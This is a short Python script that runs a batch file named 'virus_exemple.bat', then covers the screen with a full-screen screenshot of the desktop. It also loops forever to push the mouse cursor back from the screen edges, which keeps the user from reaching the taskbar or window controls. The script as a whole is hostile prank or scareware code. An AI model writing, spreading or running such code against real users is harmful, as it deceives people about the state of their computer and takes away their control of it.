import os.path
import pyautogui
import pynput
from time import sleep
from PIL import ImageGrab

########
n = 2
t1 = 0.1
t2 = 0.3
res=pyautogui.size()
decal_x=0.02
decal_y=0.03
vit_mouse=100
virus=r"\virus_exemple.bat"
########

program_path = os.path.dirname(os.path.abspath(__file__))
os.system("start"+" "+program_path+virus)
pyautogui.hotkey('win', 'd')
sleep(t1)
pict = ImageGrab.grab()
image_path = os.path.join(program_path, "screen.png")
pict.save(image_path)

for i in range(n):
    os.system(r"start "+" "+image_path)
    sleep(t2)
    pyautogui.press('f11')

def freezer_coord(x,y):
    freeze = pynput.mouse.Listener(suppress=True)
    freeze.start()
    pyautogui.moveTo(x, y)
    freeze.stop()

while True:
    coord=pyautogui.position()
    if coord[0]>res[0]*(1-decal_x):
        freezer_coord(coord[0]-vit_mouse, coord[1])
    if coord[1]>res[1]*(1-decal_y):
        freezer_coord(coord[0], coord[1]-vit_mouse)
    if coord[1]<res[1]*decal_y:
        freezer_coord(coord[0], coord[1]+vit_mouse)